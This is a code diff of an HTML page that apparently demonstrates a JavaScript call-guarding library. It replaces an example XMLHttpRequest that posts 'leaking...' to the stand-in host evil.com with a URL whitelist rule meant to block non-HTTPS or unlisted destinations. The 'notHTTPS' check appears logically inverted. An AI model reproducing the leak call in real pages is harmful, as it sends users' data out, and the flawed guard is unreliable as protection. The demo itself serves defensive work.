@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="en">
 
 <head>
@@ -7,8 +8,25 @@
 <body>
 
 <script>
+  var whiteList = ['facebook.com', 'https://yahoo.com', 'google.com']
+
+  //must be startWith....
+  function contains(str, sub) {
+    return str.includes(sub)
+  }
+  var notInn = function (url, xs) {
+    return !xs.some(function (x) {
+      return x === url
+    })
+  };
+
   var xhr = new XMLHttpRequest();
-  xhr.open("post","http://evil.com");
+
+  var notHTTPS = GG().arg(contains, GG().targ(0, String), "https://");
+  var notWhiteListedURL = GG().arg(notInn, GG().targ(1, String), whiteList)
+  GG().onCall(xhr.open).with(GG().or(notHTTPS, notWhiteListedURL)).deny();
+
+  xhr.open("post", "http://yahoo.com");
   xhr.send("leaking...")
 </script>
 </body>
